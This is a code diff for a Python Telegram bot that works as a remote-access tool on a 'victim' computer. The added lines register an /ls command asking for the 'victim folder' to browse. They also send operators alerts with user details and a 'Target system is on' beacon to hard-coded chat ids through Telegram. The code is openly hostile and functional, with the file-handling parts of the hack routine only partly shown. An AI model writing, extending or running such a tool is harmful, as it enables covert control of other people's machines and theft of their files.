@@ -4,10 +4,21 @@ import shutil
 from requests.exceptions import ConnectionError
 
 bot=telebot.TeleBot("")
-
+chatids=["",""]
 @bot.message_handler(commands=['start'])
 def start(message):
-    bot.reply_to(message,"Hello sir, wanna hack? Enter the directory name of victim folder:")
+    bot.reply_to(message,"Welcome to the hacking world!")
+    #Add chat id to which you wanna want to send info of users using your bot.....
+    for i in chatids:
+        bot.send_message(i,f'''
+    ~~~User Arrived~~~ Be careful if he is unknown to you.... 
+    ## User info:
+    # User name=@{message.chat.username}
+    # User id={message.chat.id}
+    # User's first name={message.chat.first_name}''')
+@bot.message_handler(commands=['ls'])
+def ls(message):
+    bot.reply_to(message,"Enter the directory name of victim folder:")
     bot.register_next_step_handler(message,hack)
 
 def hack(message):
@@ -89,17 +100,14 @@ def check(message):
 print("Bot Started.....")
 
 #Add below the chatid's to which you wanna forward alart when victic is online.
-
-# bot.send_message("","Target system is on......")
-# bot.send_message("","Target system is on......")
-# bot.send_message("","Target system is on......")
-# bot.send_message("","Target system is on......")
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except ConnectionError as e:
-        print(f"Connection error: {e}. Retrying...")
-        # Implement your retry logic here or just pass to retry on the next loop iteration
-    except Exception as e:
-        print(f"An unexpected error occurred: {e}")
-# bot.polling()
+for j in chatids:
+    bot.send_message(j,"Target system is on......")
+# while True:
+#     try:
+#         bot.polling(none_stop=True)
+#     except ConnectionError as e:
+#         print(f"Connection error: {e}. Retrying...")
+#         # Implement your retry logic here or just pass to retry on the next loop iteration
+#     except Exception as e:
+#         print(f"An unexpected error occurred: {e}")
+bot.polling()
